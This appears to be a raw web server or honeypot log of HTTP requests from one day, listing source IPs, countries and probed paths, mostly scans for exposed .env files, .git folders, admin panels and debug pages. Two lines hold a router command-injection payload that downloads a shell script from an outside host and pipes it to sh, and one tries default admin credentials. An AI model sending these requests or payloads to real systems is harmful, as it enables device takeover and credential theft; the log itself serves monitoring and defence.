"2025-10-09","193.138.218.212","Sweden","HTTP","/.env"
"2025-10-09","185.226.196.30","Portugal","HTTP","/xmldata?item=all"
"2025-10-09","185.226.196.27","Portugal","HTTP","/api/session/properties"
"2025-10-09","185.226.196.29","Portugal","HTTP","/cgi-bin/main.pl"
"2025-10-09","185.226.196.30","Portugal","HTTP","/owncloud/status.php"
"2025-10-09","185.226.196.30","Portugal","HTTP","/status.php"
"2025-10-09","185.226.196.29","Portugal","HTTP","/partymgr/control/main"
"2025-10-09","185.226.196.28","Portugal","HTTP","/index.jsp"
"2025-10-09","185.226.196.27","Portugal","HTTP","/ext-js/app/common/zld_product_spec.js"
"2025-10-09","185.226.196.27","Portugal","HTTP","/favicon.ico"
"2025-10-09","185.226.196.27","Portugal","HTTP","/sugar_version.json"
"2025-10-09","185.226.196.27","Portugal","HTTP","/Telerik.Web.UI.WebResource.axd?type=rau"
"2025-10-09","185.226.196.27","Portugal","HTTP","/static/historypage.js"
"2025-10-09","185.226.196.27","Portugal","HTTP","/zabbix/favicon.ico"
"2025-10-09","185.226.196.29","Portugal","HTTP","/favicon.ico"
"2025-10-09","184.105.139.72","United States","HTTP","http://api.ipify.org/?format=json"
"2025-10-09","185.226.196.30","Portugal","HTTP","/favicon-32x32.png"
"2025-10-09","185.226.196.27","Portugal","HTTP","/admin/"
"2025-10-09","185.226.196.29","Portugal","HTTP","/WebInterface/"
"2025-10-09","185.226.196.30","Portugal","HTTP","/login.html"
"2025-10-09","184.105.139.68","United States","HTTP","/geoserver/web/"
"2025-10-09","185.226.196.28","Portugal","HTTP","/jasperserver/login.html"
"2025-10-09","185.226.196.29","Portugal","HTTP","/jasperserver-pro/login.html"
"2025-10-09","185.226.196.30","Portugal","HTTP","/jasperserverTest/login.html"
"2025-10-09","185.226.196.29","Portugal","HTTP","/ssi.cgi/Login.htm"
"2025-10-09","185.226.196.30","Portugal","HTTP","/js/NewWindow_2_all.js"
"2025-10-09","185.226.196.30","Portugal","HTTP","/webfig/"
"2025-10-09","185.226.196.30","Portugal","HTTP","/OA_HTML/AppsLocalLogin.jsp"
"2025-10-09","185.226.196.29","Portugal","HTTP","/solr/"
"2025-10-09","185.226.196.30","Portugal","HTTP","/console"
"2025-10-09","185.226.196.28","Portugal","HTTP","/css/images/PTZOptics_powerby.png"
"2025-10-09","185.226.196.29","Portugal","HTTP","/identity"
"2025-10-09","185.226.196.29","Portugal","HTTP","/license.txt"
"2025-10-09","185.226.196.29","Portugal","HTTP","/wp-json"
"2025-10-09","185.226.196.28","Portugal","HTTP","/cgi-bin/authLogin.cgi"
"2025-10-09","185.226.196.27","Portugal","HTTP","/aspera/faspex/"
"2025-10-09","185.226.196.29","Portugal","HTTP","/icons/sphere1.png"
"2025-10-09","185.226.196.27","Portugal","HTTP","/helpdesk/WebObjects/Helpdesk.woa"
"2025-10-09","185.226.196.27","Portugal","HTTP","/sitecore/shell/sitecore.version.xml"
"2025-10-09","162.142.125.121","United States","HTTP","/robots.txt"
"2025-10-09","20.65.193.130","United States","HTTP","/manager/text/list"
"2025-10-09","195.178.110.201","Bulgaria","HTTP","/.git/objects/"
"2025-10-09","185.180.140.131","Portugal","HTTP","/helpdesk/WebObjects/Helpdesk.woa"
"2025-10-09","45.38.44.226","United States","HTTP","/login"
"2025-10-09","195.178.110.201","Bulgaria","HTTP","/.git/HEAD"
"2025-10-09","104.152.52.55","United States","HTTP","/favicon.ico"
"2025-10-09","64.62.156.58","United States","HTTP","/favicon.ico"
"2025-10-09","64.62.156.52","United States","HTTP","/geoserver/web/"
"2025-10-09","45.38.44.226","United States","HTTP","/login"
"2025-10-09","66.74.104.148","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh)"
"2025-10-09","66.74.104.148","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh)"
"2025-10-09","81.29.134.51","Russia","HTTP","/favicon.ico"
"2025-10-09","146.190.138.251","United States","HTTP","/favicon.ico"
"2025-10-09","146.190.138.251","United States","HTTP","/robots.txt"
"2025-10-09","64.227.128.234","India","HTTP","/.env"
"2025-10-09","64.227.128.234","India","HTTP","/.git/config"
"2025-10-09","45.38.44.226","United States","HTTP","/login"
"2025-10-09","45.38.44.226","United States","HTTP","/login"
"2025-10-09","185.180.140.125","Portugal","HTTP","/helpdesk/WebObjects/Helpdesk.woa"
"2025-10-09","45.38.44.226","United States","HTTP","/login"
"2025-10-09","195.178.110.201","Bulgaria","HTTP","/.git/objects/pack/"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/.env"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/aws/local.bak"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/prod/.env.dev"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/test/.env.uat"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/tmp/.env.save"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/nuxt/env.json"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/nuxt/env.yaml"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/temp/env/.env"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/old/.env.dist"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/test/.env.tmp"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/opencart/.env"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/test/.env.gcp"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/tmp/.env.conf"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/tmp/.env.smtp"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/web/.env.dist"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/partners/.env"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/server/env.js"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/test/.env.key"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/resource/.env"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/panel/.env.db"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/qa/config.env"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/wp-login/.env"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/prod/.env.bak"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/upload/.env.2"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/public/env.js"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/wp-config.env"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/test/.env.dev"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/tmp/.env.test"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/test/.env.php"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/umgebung/.env"
"2025-10-09","78.153.140.123","United Kingdom","HTTP","/test/.env.pem"
"2025-10-09","45.144.212.235","Ukraine","HTTP","/.git/index"
"2025-10-09","213.209.157.197","Germany","HTTP","/.env"
"2025-10-09","213.209.157.162","Germany","HTTP","/.git/config"
"2025-10-09","45.38.44.226","United States","HTTP","/login"
"2025-10-09","195.178.110.201","Bulgaria","HTTP","/.git/refs/"
"2025-10-09","143.244.181.47","United States","HTTP","/admin/config.php"
"2025-10-09","45.144.212.235","Ukraine","HTTP","/.git/refs/heads/"
"2025-10-09","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-10-09","45.38.44.226","United States","HTTP","/manager/html"
"2025-10-09","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-10-09","45.38.44.226","United States","HTTP","/manager/html"
"2025-10-09","206.168.34.43","United States","HTTP","/favicon.ico"
"2025-10-09","206.168.34.43","United States","HTTP","/favicon.ico"
"2025-10-09","206.168.34.43","United States","HTTP","/security.txt"
"2025-10-09","115.55.148.224","China","HTTP","/boaform/admin/formLogin?username=admin\u0026psd=admin"
"2025-10-09","45.38.44.226","United States","HTTP","/login"
"2025-10-09","161.35.88.128","The Netherlands","HTTP","/form.html"
"2025-10-09","161.35.88.128","The Netherlands","HTTP","/upl.php"
"2025-10-09","161.35.88.128","The Netherlands","HTTP","/t4"
"2025-10-09","161.35.88.128","The Netherlands","HTTP","/geoip/"
"2025-10-09","161.35.88.128","The Netherlands","HTTP","/favicon.ico"
"2025-10-09","161.35.88.128","The Netherlands","HTTP","/1.php"
"2025-10-09","161.35.88.128","The Netherlands","HTTP","/systembc/password.php"
"2025-10-09","161.35.88.128","The Netherlands","HTTP","/password.php"
"2025-10-09","67.207.92.120","United States","HTTP","/favicon.ico"
"2025-10-09","40.124.186.101","United States","HTTP","/manager/html"
"2025-10-09","45.38.44.226","United States","HTTP","/login"
"2025-10-09","167.94.145.101","United States","HTTP","/favicon.ico"
"2025-10-09","167.94.145.101","United States","HTTP","/favicon.ico"
"2025-10-09","167.94.145.101","United States","HTTP","/sitemap.xml"
"2025-10-09","196.251.72.177","Seychelles","HTTP","/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/backend/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/api/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/admin/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/?phpinfo=-1"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/app_dev.php/_profiler/phpinfo"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/.env.example"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/phpinfo/"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/server/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/phpinfo.php"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/laravel/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/core/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/info/"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/web/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/test/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/test"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/app_dev.php/_profiler/open?file=app/config/parameters.yml"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/secrets.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/.env.bak"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/info"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/app/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/.env.local"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/docs/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/cms/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/sendgrid/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/staging/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/download/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/new/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/old/.env"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/.env.production"
"2025-10-09","204.76.203.30","The Netherlands","HTTP","/v2/.env"
"2025-10-09","159.223.225.94","The Netherlands","HTTP","/.env"
"2025-10-09","159.223.225.94","The Netherlands","HTTP","/.git/config"
"2025-10-09","20.171.26.41","United States","HTTP","/actuator/health"
"2025-10-09","195.178.110.201","Bulgaria","HTTP","/.git/objects/info/"
"2025-10-09","88.210.63.67","Ukraine","HTTP","/boaform/admin/formLogin"
"2025-10-09","162.243.121.201","United States","HTTP","/download/powershell/"
"2025-10-09","162.243.121.201","United States","HTTP","/get.php"
"2025-10-09","195.178.110.201","Bulgaria","HTTP","/.git/refs/heads/"
"2025-10-09","20.38.35.209","United States","HTTP","/manager/text/list"
"2025-10-09","213.209.157.162","Germany","HTTP","/.git/index"
"2025-10-09","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-09","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-09","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-09","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-09","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-09","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-10-09","45.55.156.180","United States","HTTP","/favicon.ico"
"2025-10-09","20.80.72.203","United States","HTTP","/developmentserver/metadatauploader"
"2025-10-09","95.215.0.144","Russia","HTTP","/server-status"
"2025-10-09","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
